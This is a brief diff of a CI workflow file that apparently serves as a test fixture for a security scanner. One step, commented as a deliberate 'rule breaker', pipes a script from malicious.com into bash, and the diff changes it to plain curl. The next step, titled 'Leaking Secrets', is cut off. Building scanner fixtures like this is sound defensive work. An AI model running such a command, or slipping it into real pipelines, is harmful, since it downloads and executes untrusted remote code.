@@ -7,7 +7,7 @@ jobs:
     steps:
       - name: This will trigger the scanner
         # RULE BREAKER 1: Piping curl to bash
-        run: curl -sL http://malicious.com/script.sh | bash
+        run: curl -sL http://malicious.com/script.sh
 
       - name: Leaking Secrets
         env:
